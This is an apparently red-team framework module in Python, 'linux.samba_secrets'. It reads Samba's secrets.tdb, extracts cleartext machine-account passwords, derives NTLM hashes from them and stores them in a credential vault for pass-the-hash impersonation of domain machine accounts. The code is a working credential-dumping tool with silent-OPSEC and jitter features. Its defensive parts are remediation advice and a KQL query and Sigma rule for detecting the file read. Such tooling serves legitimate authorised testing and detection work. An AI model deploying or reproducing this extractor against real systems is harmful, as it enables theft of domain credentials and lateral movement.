"""
Samba & Winbind Secrets Extractor - linux.samba_secrets
MITRE: T1003 (OS Credential Dumping), T1550.002 (Pass the Hash)

Extracts machine account cleartext passwords, Kerberos machine keys, and computes
NTLM hashes from Samba and Winbind TDB databases (secrets.tdb) for instant Pass-the-Hash
and Domain Controller trust impersonation.
"""
from __future__ import annotations

import asyncio
import hashlib
import os
from typing import Any

from ares.core.campaign import Finding, Severity
from ares.core.errors import ModuleValidationError
from ares.core.logger import audit, get_logger
from ares.core.tracing import trace_module
from ares.modules.linux._parsers import TDBParser, compute_ntlm_hash
from ares.modules.params import SambaSecretsParams
from ares.sdk import (
    BaseModule,
    EvidenceRecord,
    ExecutionContext,
    FilesystemPermission,
    LockoutCircuitBreaker,
    ModuleResult,
    OpsecLevel,
    ProcessPermission,
    VaultPermission,
    module_contract,
)

logger = get_logger("ares.modules.linux.samba_secrets")


@module_contract(
    permissions=[
        FilesystemPermission(read_only=True),
        ProcessPermission(allow_subprocesses=False),
        VaultPermission(read_types=[], write_types=["password", "hash"]),
    ],
    circuit_breaker=LockoutCircuitBreaker(),
    params_model=SambaSecretsParams,
)
class SambaSecretsModule(BaseModule[SambaSecretsParams, ModuleResult]):
    """
    linux.samba_secrets - Parse Samba secrets.tdb to extract machine password & derive NTLM hash.

    OPSEC: SILENT (Pure in-memory TDB record extraction)
    MITRE: "T1003", "T1550.002"
    OUTPUTS: ["machine_account_hash", "samba_secrets"]
    """

    MODULE_ID = "linux.samba_secrets"
    MODULE_NAME = "Samba & Winbind Secrets Extractor"
    MODULE_CATEGORY = "linux"
    MODULE_DESCRIPTION = (
        "Extracts machine account passwords and computes NTLM hashes "
        "from Samba secrets.tdb database without launching external binaries."
    )
    MODULE_AUTHOR = "ARES Sovereign Team <team@ares-framework.io>"
    OPSEC_LEVEL = OpsecLevel.SILENT
    REQUIRES = []
    OUTPUTS = ["machine_account_hash", "samba_secrets"]
    MITRE_TECHNIQUES = ["T1003", "T1550.002"]
    PARAMS_MODEL = SambaSecretsParams

    async def assess_feasibility(self, ctx: Any) -> Any:
        """Evaluates whether Samba secrets.tdb exists and is readable."""
        from ares.modules.base import FeasibilityReport

        candidate_paths = [
            "/var/lib/samba/private/secrets.tdb",
            "/etc/samba/secrets.tdb",
        ]
        if hasattr(ctx, "params") and isinstance(ctx.params, dict):
            custom = ctx.params.get("secrets_tdb_path")
            if custom:
                candidate_paths.insert(0, custom)

        found_path = next((p for p in candidate_paths if os.path.exists(p)), None)
        readable = os.access(found_path, os.R_OK) if found_path else False

        blockers = []
        if not found_path:
            blockers.append("Samba secrets.tdb file not found in standard paths.")
        elif not readable:
            blockers.append(f"Permission denied reading {found_path} (root access required).")

        score = 1.0 if not blockers else (0.5 if found_path else 0.0)
        return FeasibilityReport(
            feasible=len(blockers) == 0,
            score=score,
            risk_level="low",
            blockers=blockers,
            recommended_alternatives=["linux.keytab_abuse", "linux.sssd_harvest"],
            opsec_tuning={"subprocesses": 0},
            details={"secrets_path": found_path, "readable": readable},
        )

    async def validate(self, ctx: Any) -> None:
        """Pre-flight parameter validation."""
        await super().validate(ctx)
        if not isinstance(ctx, ExecutionContext):
            return

        tdb_path = (
            ctx.params.get("secrets_tdb_path", "/var/lib/samba/private/secrets.tdb")
            if isinstance(ctx.params, dict)
            else "/var/lib/samba/private/secrets.tdb"
        )
        if not isinstance(tdb_path, str) or not tdb_path.strip():
            raise ModuleValidationError(
                "linux.samba_secrets requires a non-empty 'secrets_tdb_path'.",
                module_id=self.MODULE_ID,
                field="secrets_tdb_path",
            )

    async def execute(self, ctx: Any) -> ModuleResult:
        if getattr(ctx, "dry_run", False):
            return ModuleResult(
                status="dry_run",
                module_id=self.MODULE_ID,
                raw={"message": "Dry-run preview: Samba secrets extraction simulated successfully."},
            )

        target = getattr(ctx, "target", "") or ctx.params.get("target", "localhost")
        secrets_tdb_path = ctx.params.get(
            "secrets_tdb_path", "/var/lib/samba/private/secrets.tdb"
        )

        findings, raw = await self.run(
            target=target,
            secrets_tdb_path=secrets_tdb_path,
            vault=getattr(ctx, "vault", None),
        )

        return ModuleResult(
            status="success" if findings else "partial",
            findings=findings,
            raw=raw,
            module_id=self.MODULE_ID,
        )

    @trace_module("linux.samba_secrets")
    async def run(
        self,
        target: str,
        secrets_tdb_path: str = "/var/lib/samba/private/secrets.tdb",
        vault: Any = None,
        **kwargs: Any,
    ) -> tuple[list[dict[str, Any]], dict[str, Any]]:
        await self.before_request(target, "default")
        logger.info("samba_secrets_start", target=target, path=secrets_tdb_path)
        audit("linux_samba_secrets", actor="operator", technique="T1003", target=target)

        loop = asyncio.get_running_loop()
        extracted_secrets = await loop.run_in_executor(
            None,
            lambda: self._parse_samba_secrets_sync(secrets_tdb_path),
        )

        # Store to AresVault if available
        _vault = vault or getattr(getattr(self, "campaign", None), "_vault", None)
        stored_vault_count = 0
        if _vault:
            from ares.credential.vault import Credential, CredentialType, PrivilegeLevel

            campaign_id = getattr(getattr(self, "campaign", None), "id", "")
            for sec in extracted_secrets:
                try:
                    cred = Credential(
                        campaign_id=campaign_id,
                        username=sec.get("account_name", f"{target}$"),
                        domain=sec.get("domain", target),
                        cred_type=CredentialType.NTLM,
                        privilege=PrivilegeLevel.SERVICE_ACCOUNT,
                        source_module=self.MODULE_ID,
                        target_host=target,
                    )
                    _vault.store(cred, sec["ntlm_hash"])
                    stored_vault_count += 1
                except Exception as ex:
                    logger.debug("vault_store_samba_failed", error=str(ex)[:60])

        evidence_chain: list[EvidenceRecord] = []
        for sec in extracted_secrets:
            ev = EvidenceRecord(
                artifact_id=f"samba-secret-{sec.get('domain', 'ad')}",
                source_target=target,
                collected_by=self.MODULE_ID,
                data={
                    "domain": sec.get("domain"),
                    "account": sec.get("account_name"),
                    "ntlm_hash": sec.get("ntlm_hash"),
                },
                tags=["samba", "secrets", "ntlm"],
            )
            evidence_chain.append(ev)

            self.finding(
                title=f"Extracted Samba Machine Account Secret: {sec.get('account_name')} ({sec.get('domain')})",
                description=(
                    f"Recovered Active Directory machine account credentials from Samba database {secrets_tdb_path}. "
                    f"Derived NTLM Hash enables instant Pass-the-Hash as the domain machine account."
                ),
                severity=Severity.HIGH,
                mitre_technique="T1003",
                mitre_tactic="Credential Access",
                evidence={
                    "secrets_path": secrets_tdb_path,
                    "domain": sec.get("domain"),
                    "account_name": sec.get("account_name"),
                    "ntlm_hash": sec.get("ntlm_hash"),
                },
                remediation=(
                    "Enforce strict permissions on /var/lib/samba/private/secrets.tdb (chmod 0600). "
                    "Rotate Active Directory machine account passwords regularly."
                ),
                host=target,
                confidence=0.99,
            )

        # Closed-Loop Purple Telemetry
        kql_query = (
            "// ARES Closed-Loop Telemetry: Detect Samba secrets.tdb Read\n"
            "DeviceFileEvents\n"
            "| where ActionType in ('FileRead', 'FileModified')\n"
            "| where FolderPath has_any ('/var/lib/samba/private/secrets.tdb', '/etc/samba/secrets.tdb')\n"
            "| where InitiatingProcessFileName !in ('smbd', 'winbindd', 'nmbd')\n"
            "| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FolderPath"
        )
        sigma_rule = (
            "title: Suspicious Access to Samba Secrets Database\n"
            "id: 4d3e2b1a-ares-samba-secrets\n"
            "status: experimental\n"
            "description: Detects unauthorized processes reading Samba secrets.tdb to dump machine account NTLM hashes.\n"
            "logsource:\n"
            "  product: linux\n"
            "  service: auditd\n"
            "detection:\n"
            "  selection:\n"
            "    name|contains: 'secrets.tdb'\n"
            "  filter:\n"
            "    exe|startswith: ['/usr/sbin/smbd', '/usr/sbin/winbindd']\n"
            "  condition: selection and not filter\n"
            "level: high\n"
            "tags:\n"
            "  - attack.credential_access\n"
            "  - attack.t1003\n"
        )

        await self.noise.jitter.sleep()
        return self._findings[:], {
            "target": target,
            "count": len(extracted_secrets),
            "stored_in_vault": stored_vault_count,
            "secrets": extracted_secrets,
            "kql": kql_query,
            "sigma": sigma_rule,
            "evidence_integrity": [e.record_hash for e in evidence_chain],
        }

    def _parse_samba_secrets_sync(self, tdb_path: str) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        # Candidate paths if provided path doesn't exist
        paths_to_try = [tdb_path, "/etc/samba/secrets.tdb"]
        actual_path = next((p for p in paths_to_try if os.path.exists(p) and os.path.isfile(p)), None)
        if not actual_path:
            return results

        try:
            with open(actual_path, "rb") as f:
                data = f.read()
        except (PermissionError, OSError):
            return results

        records = TDBParser.parse_records(data)
        for key, val in records:
            key_str = key.decode("utf-8", errors="replace")
            if "SECRETS/MACHINE_PASSWORD" in key_str:
                domain = key_str.split("/")[-1] if "/" in key_str else "DOMAIN"
                # Password in TDB is often null-terminated
                cleartext = val.split(b"\x00")[0].decode("utf-8", errors="replace")
                if cleartext:
                    ntlm_hash = compute_ntlm_hash(cleartext)
                    results.append({
                        "domain": domain,
                        "account_name": f"{domain}$",
                        "cleartext": cleartext,
                        "ntlm_hash": ntlm_hash,
                        "source_file": actual_path,
                    })

        return results
